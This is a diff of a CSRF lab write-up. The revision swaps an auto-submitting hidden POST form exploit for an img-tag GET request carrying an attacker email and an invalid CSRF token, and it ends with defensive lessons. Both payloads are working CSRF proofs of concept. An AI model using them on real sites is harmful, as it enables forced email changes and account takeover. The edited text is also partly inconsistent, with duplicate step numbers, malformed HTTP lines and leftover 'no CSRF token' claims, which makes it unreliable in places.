@@ -42,11 +42,9 @@
 
 # Executive Summary
 
-A Cross-Site Request Forgery (CSRF) vulnerability was identified in this lab because the email-change functionality does not implement an effective CSRF defense.
+A Cross-Site Request Forgery (CSRF) vulnerability was discovered in this lab because the email change function applies CSRF token protection only to the POST method; when the method is switched to GET, the protection is applied, but the validity of the CSRF token is not verified.
 
-The vulnerable endpoint accepts a state-changing POST request without requiring a CSRF token or another mechanism to verify that the request was intentionally initiated from the legitimate application.
-
-An attacker can host a malicious HTML form on an external server and induce a logged-in victim's browser to submit a forged request to the vulnerable endpoint, resulting in the victim's email address being changed.
+An attacker can host a malicious HTML form on an external server and induce the logged-in victim's browser to send a forged request to the vulnerable system, resulting in the victim's email address being changed.
 
 ---
 
@@ -70,7 +68,7 @@ Authentication establishes who the user is, but it does not necessarily prove th
 2- The victim's browser automatically includes the authentication credentials required by the target application.
 3- The attacker knows or can guess the target URL and the required transaction parameters.
 4- The sensitive action can be triggered via various elements, such as a form, an image, an embedded frame, or a link.
-5- The request does not require a secret or unpredictable CSRF token.
+5- Ensure that CSRF token protection is correctly implemented for the POST method only.
 6- The application does not implement another effective CSRF defense.
 
 ---
@@ -84,7 +82,7 @@ Authentication establishes who the user is, but it does not necessarily prove th
 | HTTP Method | POST |
 | Parameter | `email` |
 | Authentication | Session cookie |
-| CSRF Protection | None observed |
+| CSRF Protection | CSRF Token |
 | Attack Platform | Exploit Server |
 | Client | Web Browser |
 | Attack Vector | Cross-site HTML form submission |
@@ -98,8 +96,8 @@ Authentication establishes who the user is, but it does not necessarily prove th
 3. Inspect the HTTP request and response using Burp Suite.
 4. Check the request to see if it contains protection values.
 5. Go to the exploit page.
-6. Create a cross-site HTML form targeting the vulnerable endpoint.
-7. Include the victim-controlled email value as a hidden form parameter.
+6. Create the img attribute targeting the vulnerable endpoint.
+7. Placing an attacker-controlled email address and a default CSRF token within the `src` attribute.
 8. Automatically submit the form from the exploit server.
 9. Deliver the exploit to the victim.
 10. Verify that the victim's email address was changed.
@@ -111,32 +109,43 @@ Authentication establishes who the user is, but it does not necessarily prove th
 ### Step 1 — Testing the Update email
 
 ```email
-example@gmail.com
+mohamad@gmail.com
 ```
 
-The email address is updated via the `email` parameter, and the browser uses session data to identify the user without any protection.
+The email address is updated via the `email` parameter, and the browser uses session data to identify the user, with CSRF token protection in place.
 
+### Step 2 — Change the method from post to get
 
-### Step 2 — Testing Email Change from Within Burp Suite
-
-```email
-hacker@gmail.com
+```text
+GET/my-account/change-email/HTTP/1.1
+HOST:XXXXXXXX
+Cookie Session: XXXXXXX
+email= mohamad@gmail.com & csrf= XXXXXX
 ```
-The server responded with `302 Found` and redirected the request back to the account page. More importantly, the request contained no visible CSRF token or other unpredictable anti-CSRF value.
+In the response, we will observe the error message "HTTP/2 Bad Request": "Missing Parameter 'email'"
+In other words, the 'email' parameter is required.
 
-The request was accepted and the email address was successfully changed, demonstrating that the endpoint performs the state-changing operation without requiring an additional CSRF defense.
+### Step 3 — Testing the inclusion of the `email` parameter in the URL without the `csrf` parameter
 
-### Step 3 — Go to the exploit page and enter the code.
+```text
+GET/my-account/change-email?email= mohamad@gmail.com/HTTP/1.1
+HOST:XXXXXXXX
+Cookie Session: XXXXXXX
 
-```html
-<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
-    <input type="hidden" name="email" value="hacker@gmail.com">
-</form>
-<script>
-        document.forms[0].submit();
-</script>
 ```
-The form generates a POST request that updates the email address to the value we specified in the code, and then JavaScript is used to submit the form automatically.
+
+In the response, we will observe the error message "HTTP/2 Bad Request": "Missing Parameter 'csrf'"
+In other words, the 'csrf' parameter is required.
+
+### Step 3 — Testing the inclusion of the `email` parameter in the URL with the `csrf` parameter With a default value
+
+```text
+GET/my-account/change-email?email= mohamad@gmail.com & csrf= invalid/HTTP/1.1
+HOST:XXXXXXXX
+Cookie Session: XXXXXXX
+
+```
+In the response, we will observe A "302 Found" response appeared without any error message, indicating that the server requests the CSRF token during a GET request but fails to validate it correctly and therein lies the vulnerability.
 
 ---
 
@@ -146,21 +155,22 @@ The vulnerable functionality uses the following endpoint:
 
 ```http
 POST /my-account/change-email
+
+email= mohamad@gmail.com & csrf= XXXXXX
 ```
-The relevant request parameter is: email=example@gmail.com
+The relevant request parameter is: email=mohamad@gmail.com
 The request is authenticated using the victim's session cookie.
 
-No CSRF token or other unpredictable value was present in the request.
+The request includes a CSRF token, but it is not properly validated for the GET method.
 
 Therefore, the application accepts the state-changing request based on the authenticated session without verifying that the request was intentionally initiated by the legitimate application.
 
 ```http
-POST /my-account/change-email HTTP/2
+GET /my-account/change-email?email= mohamad@gmail.com & csrf= invalid HTTP/2
 Host: TARGET
 Cookie: session=[REDACTED]
 Content-Type: application/x-www-form-urlencoded
 
-email=test@gmail.com
 ```
 
 ---
@@ -170,35 +180,16 @@ email=test@gmail.com
 ## Payload Used
 
 ```html
-<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
-    <input type="hidden" name="email" value="hacker@gmail.com">
-</form>
-<script>
-        document.forms[0].submit();
-</script>
+<img src="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email= attacker@gmail.com & csrf= invalid">
 ```
 
 ## Why This Payload Works
 
 ```html
-<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+<img src="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email= attacker@gmail.com & csrf= invalid">
 
 ```
-It creates a form that sends a POST request to the entered page.
-
-
-```html
- <input type="hidden" name="email" value="hacker@gmail.com">
-```
-You enter the email address value you want to change, without it being visible to the victim.
-
-```html
-<script>
-        document.forms[0].submit();
-</script>
-```
-It causes the browser to submit the form automatically.
-The exploit does not contain the victim's session cookie. Instead, the attack relies on the victim's authenticated browser to provide the authentication context when submitting the request to the target application.
+The `img` element accepts a `src` attribute. When the URL of the vulnerable page including the `email` and `csrf` parameters—is placed within this attribute, the browser interprets the URL and attempts to load the page from the `src` source. Consequently, the victim's browser sends a GET request that modifies the email address, utilizing the victim's own cookies.
 
 ---
 
@@ -210,24 +201,18 @@ Attacker
    ▼
 Exploit Server
    │
-   │ Hosts malicious HTML form
+   │ malicious HTML
    ▼
-Victim visits exploit page
+Victim Browser
    │
+   │ automatic GET
+   │ + victim session
    ▼
-Browser automatically submits POST request
+Target Server
    │
-   ├── POST /my-account/change-email
-   └── email=attacker@example.com
-   │
+   │ GET + invalid CSRF
    ▼
-Target Application
-   │
-   ▼
-Victim's authenticated session
-   │
-   ▼
-Email address changed
+Email changed
   
 ```
 
@@ -257,8 +242,7 @@ The root cause is the absence of an effective CSRF defense on the state-changing
 The application accepts the request:
 
 ```http
-POST /my-account/change-email
-email=attacker@example.com
+GET /my-account/change-email?email= mohamad@gmail.com & csrf= invalid HTTP/2
 ```
 without requiring a CSRF token or another effective mechanism to verify that the request originated from an authorized and intentional interaction with the application.
 As a result, an attacker-controlled page can construct and submit a forged request to the vulnerable endpoint.
@@ -313,7 +297,7 @@ As a result, an attacker-controlled page can construct and submit a forged reque
 - Authentication is not equivalent to intent verification.
 - CSRF exploits the victim's authenticated session rather than stealing the session itself.
 - A state-changing request should require an appropriate CSRF defense.
-- The absence of a CSRF token can make predictable state-changing requests forgeable.
+- The CSRF protection token must be applied to all methods.
   
 ---
 
@@ -355,8 +339,8 @@ As a result, an attacker-controlled page can construct and submit a forged reque
 
 # Conclusion
 
-This practical experiment demonstrated the successful exploitation of a Cross-Site Request Forgery (CSRF) vulnerability in a laboratory environment.
+This practical experiment demonstrated the successful exploitation of a Cross-Site Request Forgery (CSRF) vulnerability in a lab environment.
 
-The vulnerable endpoint accepted a state-changing request without requiring a CSRF token or another effective CSRF defense. By hosting a malicious HTML form on an external exploit server, the attacker was able to cause the victim's browser to submit a forged request to the target application.
+The vulnerable endpoint accepted a request to alter the system state without validating the CSRF token. By hosting an HTML `<img>` element on an external exploit server, the attacker was able to induce the victim's browser to send a forged request to the target application.
 
-The key lesson is that authentication alone does not verify user intent. State-changing requests should therefore be protected using appropriate CSRF defenses such as anti-CSRF tokens, appropriate SameSite cookie policies, and Origin/Referer validation where applicable.
+The key takeaway is that authentication alone is insufficient to verify user intent. CSRF tokens must be implemented across all methods, appropriate SameSite cookie policies applied, and Origin/Referer headers validated where applicable.
